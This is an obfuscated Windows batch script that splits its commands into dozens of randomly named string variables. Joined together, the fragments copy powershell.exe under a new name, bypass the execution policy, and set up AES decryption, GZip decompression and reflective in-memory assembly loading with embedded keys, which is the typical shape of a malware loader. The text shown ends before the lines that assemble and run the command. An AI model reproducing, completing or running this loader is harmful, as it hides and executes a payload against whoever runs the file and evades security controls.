@echo off
set "zxXDFjWwqP=ow"
set "gtiCgHUFyn=we"
set "RkvBiGBjRQ=he"
set "KGUnNMWbbi=1."
set "rBhvmDRXYt=:\"
set "jjCVYwZOGo=in"
set "hfNyaNgHku=po"
set "tXjSdkSHvB=xe"
set "qWAAhESvna=he"
set "IHEDiPXtET=em"
set "eYkImhyKMv= C"
set "wWwybWgjyM=32"
set "fpPmJntAAF=Po"
set "dDrOeTKauA=Sy"
set "QkvQBWuiyr=rs"
set "oOSmZMmwZh=ll"
set "GoRHcmhgOI=ll"
set "IWJgYFdUtX=Wi"
set "fTfuJXKXXe=.e"
set "ePGPpMEPsf=ws"
set "WsCkPhzALE=we"
set "qxQgbLaggf=nd"
set "GqJUqZyDHz=0\"
set "zWcPldJHEr=\W"
set "PysyHBtOOo= /"
set "OrPHmuCNGm=rS"
set "OouPmwQgRj=y "
set "DLRTTkYfBO=st"
set "WrwBeHpsRW=do"
set "KlOsmYiKYX=co"
set "LeSCtGyzQk=py"
set "mddOrOziap=\v"
set "OBAxCipeKH=s\"
set "KmNZBuwbLk= %~dp0"
set "JyEYHsQNKk=cd"
set "OZZOeXDfXs=tem."
set "UvCqcXPupt=form"
set "ldLtcLDFlL=[-1."
set "nrarizJXnI=Obje"
set "DAHPRJaPbC=$dVw"
set "rnGIFzYOkO=stem"
set "ZnABeClRTh=XGrf"
set "bRgdsFvjuV=ddin"
set "ZTauasOsGh=i.Su"
set "yVVNgojnsF=e = "
set "RRwhBCPhEE=in $"
set "epeNQKAudL=$KGp"
set "plqrfuSfJK=zHhH"
set "TkYElizHEU=bjec"
set "NNDtTEubPl=ct S"
set "TTACgWVmdt=ion."
set "mnioShQGhw=PxEW"
set "jMWANHytGO=7;$K"
set "PRhsvOUgKj=-Obj"
set "nfbTtDpgNK=ress"
set "OkHCEngkdN=y.Ci"
set "fTDwZkxIvO=wql."
set "BTcLvRcLcd=y]::"
set "BukRuFurOJ=t Sy"
set "gbOVGaOtug=ypto"
set "sBnOFbYzYT=nOJh"
set "pHUBowJPbT=ode]"
set "tXqqJqQUeJ=.Ass"
set "XISXiSlkJe=tem."
set "jQsvIKZqHd=ew-O"
set "QLekuHhuok=ss -"
set "sOtMbIvDsL=.Mod"
set "IEZhPhWdeL=k; }"
set "cMRCebTtRV=Syst"
set "ttOEXyzKaF=[Sys"
set "RMwcdHXYxB='0Pg"
set "HFXLMFDYCc=d;$K"
set "NRYLoQdFyI=('da"
set "EyMbnJPArV=]::("
set "mQXdySqbJh=]::C"
set "HlAaLfsfev=O.Me"
set "iuOBtwRxei=bypa"
set "DjOQbOHPlU='[-1"
set "tYYlESvXpH=saBm"
set "ikeBCUPDmX=oiyB"
set "fxouLSTwxc=ring"
set "zeMAPVqKEZ=.Dis"
set "ePKnOdQdKz=daeR"
set "PMnThvYPYV=join"
set "cLZRJAdgyn=;$dV"
set "AewcCWJUPP=n ''"
set "xeDuejvgwD=RGIe"
set "DxBDjvLWEd=-joi"
set "vSbXXlUYVC=Comp"
set "DFpVXuGhTt=null"
set "oLwUlXyNdu=th('"
set "pETWQxdATY=-ep "
set "tuTBtnSnUq=GpsW"
set "rBUbvkGLIq=)) {"
set "MkILnTTFPL=[]] "
set "hLRpuiERMB=;$JW"
set "yqIbiBewik=.Key"
set "PvZRuRvCNK===')"
set "ywkgdmHGYp=nOJh"
set "kaFRDejrBX=Secu"
set "JybTzCQYvX=::('"
set "akmbIjQdyj=zuZI"
set "EMJyUyBUPK=F'[-"
set "QvSxZXCwLR=L4Yi"
set "yfjyYbTzzX=lit("
set "GICxlcbOVc=grap"
set "GFPmSxeQGQ=c = "
set "yKPsfKhCKk=ect "
set "KNYHcjRTkh=Gqkr"
set "xXKwAORBga=eMVs"
set "lvjfWuLkMf=pres"
set "AQheWzVFUR=-1.."
set "zWUvNQcYEn=.Cry"
set "uyMFZnjjmT=, (,"
set "VBxPtEaIoN=hy.A"
set "IAeUGaBvuD=nirt"
set "qIlJBypEEq=op ="
set "kGSfeAUwjH=m.Re"
set "aWynLLrGmW=-joi"
set "ltVPnRHXDv=tem."
set "OQfwEyxgcY= = $"
set "eqnnkWrYck=.Con"
set "ydUowTqdWx=Disp"
set "fJukElwtpV=gth)"
set "ygfFCOulmS=);$O"
set "MBNAwjMVUw=oint"
set "INegzrfrNG=('%*'"
set "hPPlpaEVmc=Secu"
set "TIHxJMyfWg=rt]:"
set "rScAbNJBQf=GIeJ"
set "RjIspoIUsV=1..-"
set "QixkfvJvap= New"
set "xkCExnhrsj=$RGI"
set "bxFSVtlWdn=]::N"
set "nvUikxjKHK=('Tg"
set "fxJBKltCmM=.Cry"
set "CCeYjRGdBO=.IO."
set "OEyQqoudAR=gjYA"
set "bpKRYWwJHb=l5E7"
set "WLTfgMNNkB=($TC"
set "amSlOIfqvR='txe"
set "TKymrubzEE= '')"
set "OuVhZyKHfZ=flec"
set "AgbFQdBWVt=embl"
set "BPMzUcNrpP=V = "
set "icbSMeRcfU=tzi."
set "MoSwuSsgYp=GpsW"
set "rWziWOJIsK=TllA"
set "YHRVOaCWhG=$OGq"
set "ZBDHBoCETO=Conv"
set "UOqHoefxOs=kr);"
set "UXOCVpwsPb=s75K"
set "DUEoAGwSLr=ose("
set "ZWJKijHfgJ=oryS"
set "Mgvwvijbzn=sW.I"
set "CsiYhuIeiT=Fajl"
set "sjGkWacFQR=$nOJ"
set "hjppULbpxm=-nop"
set "ZJAQubORHV=sion"
set "ZVjOEpfOHL=GpsW"
set "CkmBgIYDez=..-1"
set "dWhZbuygSG=S46e"
set "rASdRkNPxf= [Sy"
set "nRLyYnDWPp=3); "
